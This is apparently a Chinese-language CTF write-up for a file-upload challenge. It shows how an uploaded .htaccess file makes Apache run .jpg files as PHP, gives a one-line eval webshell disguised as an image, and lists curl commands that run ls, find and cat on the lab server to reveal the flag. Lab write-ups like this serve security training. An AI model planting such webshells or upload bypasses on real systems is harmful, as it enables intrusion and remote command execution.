## 漏洞分析
该关卡过滤了常见的 PHP 后缀（如 `.php`），导致无法直接上传木马文件。但服务器未过滤 `.htaccess` 文件。
`.htaccess` 是 Apache 服务器的配置文件，通过上传自定义的 `.htaccess`，可以改变当前目录下文件的解析规则，例如将图片后缀（`.jpg`）解析为 PHP 代码。
## 攻击过程

### 步骤一：上传自定义的 `.htaccess` 文件
在本地新建一个文本文件，写入以下内容并命名为 `.htaccess`（注意前面有个点）：
apache
AddType application/x-httpd-php .jpg
### 步骤二：上传伪装成图片的木马
新建文件 shell.jpg，内容为一句话木马：
<?php @eval($_POST['pass']);?>
将 shell.jpg 上传至服务器，页面返回路径 upload/shell.jpg。
## 获取 Flag
由于本地安全软件可能会拦截 Webshell 管理工具，这里使用 Windows 自带的 curl 命令直接发包执行系统命令：
### 第一步：验证木马执行（查看目录）
curl -X POST "http://靶场域名/upload/shell.jpg" -d "pass=system('ls');"
### 第二步：全盘搜索 Flag 文件
curl -X POST "http://靶场域名/upload/shell.jpg" -d "pass=system('find / -name *flag*');"
（在返回结果中排除 /sys/ 等系统目录干扰，敏锐定位到 /var/www/html/flag_108369996.php）
### 第三步：读取文件内容
curl -X POST "http://靶场域名/upload/shell.jpg" -d "pass=system('cat /var/www/html/flag_108369996.php');"

## Flag
ctfhub{f58a8f8fb706e94591b18105}

## 总结
1..htaccess 重写解析：在 Apache 环境中，如果允许上传 .htaccess 且允许重写配置，就可以通过修改解析规则，将任意后缀的文件当作 PHP 脚本执行，从而绕过黑名单。

2.文件名伪装：结合图片后缀（如 .jpg）上传，是配合 .htaccess 的最经典组合拳，不仅绕过了后缀检测，还能让木马隐蔽在看似正常的图片目录中。
